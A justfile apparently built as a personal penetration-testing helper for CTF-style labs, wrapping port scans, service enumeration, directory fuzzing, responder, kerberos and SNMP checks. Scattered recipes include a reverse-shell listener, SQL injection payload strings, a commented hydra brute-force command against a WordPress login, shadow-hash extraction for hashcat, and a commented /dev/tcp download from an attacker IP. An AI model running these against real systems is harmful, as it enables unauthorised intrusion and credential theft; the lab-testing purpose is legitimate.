#!/usr/bin/env -S just --working-directory . --justfile

default:
	@hack --list --list-heading '' --list-prefix ''

#update this script
update:
	curl -s https://raw.githubusercontent.com/r0nk/hack/master/hack | sudo tee /usr/bin/hack | wc -l

ftp:
	ftp ftp@$(hack ip)
	nmap --script ftp-* -p 21 $(hack ip) -o nmap-ftp.txt
	openssl s_client -connect $(hack ip):$(hack port) -starttls ftp # Get certificate
#	hydra -s 21 -C /usr/share/sparta/wordlists/ftp-default-userpass.txt -u -f > $ip
	echo "Check_upload_potential	15" | anew todo.txt
	echo "common_creds_check	15" | anew todo.txt

#if 'passive', just type passive on the client to disable

msf:
	msfconsole -x "set RHOSTS $(hack ip); set RPORT $(hack port);"


scope_level:
	echo "domain_names	60" | anew todo.txt
	echo "ip_ranges_asn_etc	60" | anew todo.txt
	echo "strange_ports	60" | anew todo.txt
	echo "http_ports_unusual	60" | anew todo.txt
	echo "http_main	60" | anew todo.txt

nmap:
	nmap -v -sV -sC -p- $(hack ip) -oA nmap_full
	echo "nmap_udp 60" | anew todo.txt
	echo "version_checks 60" | anew todo.txt

nmap_udp:
	nmap -v -sU -p- $(hack ip) -oA nmap_udp

#Get the target ip address from the current directory
ip:
	@echo {{invocation_dir()}} | grep -Eo "([0-9]{1,3}[\.]){3}[0-9]{1,3}"

#Get the domain from the current directory
domain:
	@pwd | tr '/' '\n' | grep "\." | head -n 1

#Get the port from the current directory
port:
	@pwd | tr '/' '\n' | grep -A 1 "\." | tail -n 1

default_device := "tun0"
#Get our ip, for reverse shells and the like
lip dev=default_device:
	@ip -4 addr show {{dev}} | grep -oP '(?<=inet\s)\d+(\.\d+){3}'


#udp/5355, Non-dns hostname to ip
LLMNR:
	echo "responder" | anew todo.txt

#udp/137, NetBIOS names to ip addresses on a local network. Predecessor of LLMNR
NBT-NS:
	echo "responder" | anew todo.txt

#requires LLMNR
responder dev=default_device:
	responder -I {{dev}}

unknown_port:
	firefox "https://book.hacktricks.xyz/?q=$(hack port)" "https://duckduckgo.com/?t=ftsa&q=port+$(hack port)&ia=web" "https://www.speedguide.net/port.php?port=$(hack port)"
	echo "search_version_cve 10" | anew todo.txt
	echo test | timeout 5 nc $(hack ip) $(hack port) | tee banner.txt
	nmap -sC -sV $(hack ip) -p $(hack port) --version-intensity 9 --version-trace -o nmap.version.txt

rpc:
	impacket-rpcdump $(hack ip) > rpcdump.txt
	cat rpcdump.txt  | grep -i "pipe"  | sort | uniq > pipes.txt
#rpcclient -U "" target-ip

robots:
	curl -L -v $(hack domain)/robots.txt -o robots.txt

hostsfix:
	curl -v $(hack ip) 2>&1 | grep Location: | choose 2 | unfurl domains | anew domains.txt
	echo $(hack ip) $(head -n 1 domains.txt) | sudo tee -a /etc/hosts

final:
	echo "ip addr && cat /root/proof.txt /home/*/local.txt"

log-capture pane:
	tmux capture-pane -t 0:{{pane}} -p -S-

http:
	echo $(hack domain) | katana | anew spider_urls | anew urls.txt
	curl -L -s $(hack domain)/robots.txt -o robots.txt
	echo $(hack domain) | dnsx -asn  -a -recon -resp > dnsx.txt
	echo "vhosts 60" | anew todo.txt
	echo "fields 60" | anew todo.txt
	echo "param 60" | anew todo.txt
	echo "paths 60" | anew todo.txt
	echo "cookies 60" | anew todo.txt
	echo "headers 60" | anew todo.txt
	echo "methods 60" | anew todo.txt
	echo "source 60" | anew todo.txt
	echo "tech_stack 60" | anew todo.txt

smtp:
	echo "username_enum" | anew todo.txt

lfi:
	echo "passwd" | anew todo.txt
	echo "config.php" | anew todo.txt

mysql:
	nmap -p 3306 --script="+*mysql* and not brute and not dos and not fuzzer" -vv -oN mysql  $(hack ip)

wl:
	@find . /usr/share/seclists/ -type f | fzf

path_fuzz:
	ffuf -u http://$(hack ip)/FUZZ -w $(hack wl) -recursion -od ffufo -ac

path_fuzz_slow:
	ffuf -u http://$(hack domain)/FUZZ -w $(hack wl) -recursion -od ffufo -ac -t 1 -p 0.1-0.3

subdomain_fuzz:
	ffuf -u http://$(hack ip) -H "Host: FUZZ.$(head -n 1 domains.txt)" -w $(hack wl) -od ffufo -ac

rev port:
	@hack lip
	rlwrap -cAr nc -lvnp {{port}}

#start a http server for the current directory
hs port:
	ip addr | grep inet | sort
	python3 -m http.server {{port}}

sqli:
	echo "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection"
	echo "' %27 \" %22 # %23 ; %3B) *  %%2727  %25%27 "| tr ' ' '\n' | anew test.wl
	echo "union all select 1,2,3,4,5,6,7,8"

#sqliraw:
#	sqlmap -r raw.http --risk 3 --level 5

ldap:
	nmap -sV --script "ldap* and not brute" -p 389 $(hack ip) -o nmap.ldap.txt
	ldapsearch -H ldap://$(hack ip)

field:
	echo "reflection/xss	30" | anew todo.txt
	echo "reflection/php	30" | anew todo.txt
	echo "reflection/sqli	30" | anew todo.txt
	echo "reflection/ssti	30" | anew todo.txt
	echo "errors		30" | anew todo.txt
	echo "format_strings	30" | anew todo.txt
	echo "sleep		30" | anew todo.txt
	echo "platform_specific	30" | anew todo.txt
	echo "sqli	30" | anew todo.txt
	echo "command_injection	30" | anew todo.txt

#simple network management protocol check
snmp-check:
	sudo nmap -sU -sV -sC --open -p 161 $(hack ip)

#simple network management protocol testing
snmp:
	echo "find_community_string	60" | anew todot.txt
	nmap --script "snmp* and not snmp-brute" $(hack ip)
	snmp-check $(hack ip)
	snmpbulkwalk -c public -v2c $(hack ip) .

smb:
	enum4linux -a $(hack ip) | tee enum4linux.txt
	enum4linux -u "guest" -p "" $(hack ip) | tee enum4linux.guest.txt
	enum4linux -u "" -p "" $(hack ip) | tee enum4linux.empty.txt
	echo "lookupsid" | anew todo.txt
	echo "find_password_policy" | anew todo.txt
	#lookupsid.py $(hack domain)@$(hack ip)
	#cat sid.txt  | grep -i sidtypeuser | tr '\\' ' ' | choose 2 > users.txt

mssql:
	nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $(hack ip) -o nmap.mssql.txt
#	nxc mssql $(hack ip) -u Operator -p operator  -q 'select @@version; select user_name(); SELECT name FROM master.dbo.sysdatabases;'

hashes:
	echo "check_crackstation	10" | anew todo.txt
	echo "hashcat/rockyou		30" | anew todo.txt
	echo "john/rockyou	30" | anew todo.txt

shadowcrack:
	cat shadow | tr ':' ' ' | awk '{print $2}' | grep "\\$" | anew hashes.txt
	hashcat hashes.txt

dns_scope:
        cat domains.txt | dnsx -nc -a -resp > dnsx.txt
        cat dnsx.txt | choose 2 | tr -d '[' | tr -d ']' | sort | uniq -c | sort -n  > ip_sus.txt
        cat ip_sus.txt | choose 1 | anew ips.txt

naabu:
        cat ips.txt | naabu | anew naabu.txt
        cat naabu.txt  | tr ':' ' ' | awk '{print $2}' | sort | uniq -c | sort -rn > naabu_sus.txt

httpx_full:
	httpx -l domains.txt -cdn -sc -cl -location -title -bp -ip -o httpx_full.txt

add_http_todo:
	cat httpx_full.txt | choose 0 | unfurl domains | awk '{print $1,10}' |  anew todo.txt

length_sorted_tasks:
	omira task | choose 1 | awk '{print length(), $0 | "sort -n"}' | choose 1

dns:
	dig any $(head -n 1 domain.txt) @$(hack ip)
	dig afxr @$(hack ip)
	dig afxr @$(hack ip) $(head -n 1 domain.txt)

#port 88 methodology
kerberos:
	echo "kerbrute	30" | anew todo.txt
	#kerberoasting, these spns are hashes that can be cracked for credentials.
	echo "getuserspns	30" | anew todo.txt
	nmap -sV -p $(hack port) --script="banner,krb5-enum-users" --script-args krb5-enum-users.realm="$(hack domain)",userdb=$(hack wl) $(hack ip)

sip:
	nmap -sV -p $(hack port) --script="sip-enum-users,sip-methods"

wordpress:
	wpscan --url http://$(hack ip):$(hack port)
	# try to brute force the login with hydra
	# hydra -L lists/usrname.txt -P lists/pass.txt localhost -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
	echo "wordpress/brute_force_login 60" | anew todo.txt

#port 9389
active_directory_web_services:
	echo "look_into/ADModule	60" | anew todo.txt


linpeas:
	curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
#cat > l < /dev/tcp/10.10.14.3/8888 # if the server doesn't have nc

